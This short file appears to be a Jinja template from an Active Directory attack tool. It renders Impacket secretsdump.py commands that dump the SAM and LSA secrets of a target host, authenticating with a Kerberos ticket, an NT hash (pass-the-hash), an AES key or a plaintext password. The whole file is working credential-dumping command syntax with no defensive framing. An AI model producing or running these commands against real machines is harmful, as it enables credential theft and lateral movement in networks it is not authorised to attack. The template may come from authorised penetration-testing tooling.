# Dump the SAM and LSA cache on {{target.name}} to get the plain_password_hex
{% if parent.krb_auth %}
secretsdump.py '{{target_no_dollar}}' -k -no-pass -dc-ip {{dc_ip}} -target-ip {{target_ip|red}}
{%- elif parent.secret_type == T_SECRET_NTHASH %}
secretsdump.py '{{fqdn}}/{{parent.obj.name}}@{{target_no_dollar}}' -hashes :{{parent.secret|red}} -dc-ip {{dc_ip}} -target-ip {{target_ip|red}}
{%- elif parent.secret_type == T_SECRET_AESKEY %}
secretsdump.py '{{fqdn}}/{{parent.obj.name}}@{{target_no_dollar}}' -k -no-pass -aesKey {{parent.secret|red}} -dc-ip {{dc_ip}} -target-ip {{target_ip|red}}
{%- elif parent.secret_type == T_SECRET_PASSWORD %}
secretsdump.py '{{fqdn}}/{{parent.obj.name}}:{{parent.secret|red}}@{{target_no_dollar}}' -dc-ip {{dc_ip}} -target-ip {{target_ip|red}}
{%- endif %}
